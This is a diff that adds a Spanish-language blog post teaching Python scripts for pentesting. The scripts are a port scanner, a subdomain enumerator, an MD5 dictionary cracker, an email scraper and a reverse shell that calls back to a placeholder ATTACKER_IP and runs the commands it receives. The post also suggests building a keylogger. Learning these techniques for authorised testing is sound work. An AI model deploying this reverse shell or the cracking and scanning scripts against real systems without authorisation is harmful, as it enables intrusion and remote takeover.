@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Python para Hackers: Scripts esenciales | CyberNexus</title>
+    <meta name="description"
+        content="Aprende Python aplicado a ciberseguridad. Port scanner, brute force, web scraping y automatización de tareas de pentesting.">
+    <link rel="stylesheet" href="../css/style.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Share+Tech+Mono&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+    <div class="scanline"></div>
+    <div class="overlay"></div>
+
+    <header>
+        <nav class="container">
+            <div class="logo">
+                <span class="prompt">root@cybernexus:~#</span> <span class="cursor">_</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="../index.html">/inicio</a></li>
+                <li><a href="../tools.html">/herramientas</a></li>
+                <li><a href="../blog.html" class="active">/blog</a></li>
+            </ul>
+            <div class="hamburger">
+                <i class="fas fa-bars"></i>
+            </div>
+        </nav>
+    </header>
+
+    <main class="container">
+        <article class="blog-post">
+            <h1 class="glitch" data-text="Python Hacking">Python para Hackers: Scripts esenciales</h1>
+            <p class="meta">Publicado el 22 Ene, 2025 por Admin</p>
+
+            <div class="content">
+                <p>Python es el lenguaje favorito de los hackers éticos. Su sintaxis simple y poderosas librerías lo
+                    hacen perfecto para automatizar tareas de pentesting.</p>
+
+                <h2>¿Por qué Python para Hacking?</h2>
+                <ul>
+                    <li>Sintaxis clara y fácil de aprender</li>
+                    <li>Librerías especializadas (Scapy, Requests, BeautifulSoup)</li>
+                    <li>Multiplataforma (Windows, Linux, macOS)</li>
+                    <li>Usado por herramientas como Metasploit y SQLmap</li>
+                </ul>
+
+                <h2>Script 1: Port Scanner Básico</h2>
+                <p>Escanea puertos abiertos en un objetivo.</p>
+                <pre><code>import socket
+from datetime import datetime
+
+target = input("Ingresa la IP objetivo: ")
+print(f"Escaneando {target}...")
+print(f"Inicio: {datetime.now()}")
+
+try:
+    for port in range(1, 1025):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket.setdefaulttimeout(0.5)
+        result = s.connect_ex((target, port))
+        if result == 0:
+            print(f"Puerto {port}: ABIERTO")
+        s.close()
+except KeyboardInterrupt:
+    print("\nEscaneo cancelado")
+except socket.gaierror:
+    print("Hostname no resuelve")
+except socket.error:
+    print("No se pudo conectar")</code></pre>
+
+                <h2>Script 2: Subdomain Enumerator</h2>
+                <p>Encuentra subdominios de un dominio objetivo.</p>
+                <pre><code>import requests
+
+def check_subdomain(subdomain, domain):
+    url = f"http://{subdomain}.{domain}"
+    try:
+        requests.get(url, timeout=2)
+        return True
+    except requests.ConnectionError:
+        return False
+
+domain = input("Dominio objetivo: ")
+wordlist = ["www", "mail", "ftp", "admin", "test", "dev", "api"]
+
+print(f"Buscando subdominios de {domain}...")
+for sub in wordlist:
+    if check_subdomain(sub, domain):
+        print(f"[+] Encontrado: {sub}.{domain}")</code></pre>
+
+                <h2>Script 3: Hash Cracker (MD5)</h2>
+                <p>Rompe hashes MD5 usando un diccionario.</p>
+                <pre><code>import hashlib
+
+def crack_md5(hash_to_crack, wordlist_file):
+    with open(wordlist_file, 'r') as f:
+        for line in f:
+            word = line.strip()
+            hash_word = hashlib.md5(word.encode()).hexdigest()
+            if hash_word == hash_to_crack:
+                return word
+    return None
+
+target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # "password"
+result = crack_md5(target_hash, "rockyou.txt")
+
+if result:
+    print(f"Hash crackeado: {result}")
+else:
+    print("No se encontró en el diccionario")</code></pre>
+
+                <h2>Script 4: Web Scraper de Emails</h2>
+                <p>Extrae emails de una página web (OSINT).</p>
+                <pre><code>import requests
+import re
+
+def extract_emails(url):
+    response = requests.get(url)
+    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', 
+                        response.text)
+    return list(set(emails))
+
+url = input("URL objetivo: ")
+emails = extract_emails(url)
+
+print(f"Emails encontrados: {len(emails)}")
+for email in emails:
+    print(email)</code></pre>
+
+                <h2>Script 5: Reverse Shell (Educativo)</h2>
+                <p><strong>⚠️ SOLO PARA LABORATORIOS PROPIOS</strong></p>
+                <pre><code>import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ATTACKER_IP", 4444))
+
+while True:
+    command = s.recv(1024).decode()
+    if command.lower() == "exit":
+        break
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
+
+s.close()</code></pre>
+
+                <h2>Librerías Imprescindibles</h2>
+
+                <h3>Scapy</h3>
+                <p>Manipulación de paquetes de red a bajo nivel.</p>
+                <pre><code>pip install scapy</code></pre>
+
+                <h3>Requests</h3>
+                <p>HTTP requests simplificadas.</p>
+                <pre><code>pip install requests</code></pre>
+
+                <h3>BeautifulSoup</h3>
+                <p>Parsing de HTML/XML.</p>
+                <pre><code>pip install beautifulsoup4</code></pre>
+
+                <h3>Paramiko</h3>
+                <p>Cliente SSH en Python.</p>
+                <pre><code>pip install paramiko</code></pre>
+
+                <h2>Proyectos para Practicar</h2>
+                <ol>
+                    <li>Crear un keylogger (solo en tu propia máquina)</li>
+                    <li>Automatizar escaneos de Nmap con Python</li>
+                    <li>Construir un fuzzer de formularios web</li>
+                    <li>Desarrollar un bot de Telegram para recibir alertas</li>
+                </ol>
+
+                <div class="cta-section">
+                    <p>Domina Python para Hacking:</p>
+                    <a href="[ENLACE_AFILIADO_CURSO]" class="btn primary">Curso Completo en Udemy</a>
+                </div>
+
+                <h2>Recursos Gratuitos</h2>
+                <ul>
+                    <li><strong>Libro:</strong> "Black Hat Python" de Justin Seitz</li>
+                    <li><strong>GitHub:</strong> github.com/topics/python-hacking</li>
+                    <li><strong>YouTube:</strong> Canal "NetworkChuck" y "John Hammond"</li>
+                </ul>
+            </div>
+
+            <div class="cta-section">
+                <p>Descarga 20 Scripts de Python para Hacking (ZIP)</p>
+                <a href="#" class="btn secondary"><i class="fas fa-download"></i> Descargar Gratis</a>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 CyberNexus. Conocimiento de Código Abierto.</p>
+            <br>
+            <a href="#" class="btn donate"><i class="fas fa-coffee"></i> Invítame un Café</a>
+        </div>
+    </footer>
+
+    <script src="../js/script.js"></script>
+</body>
+
+</html>
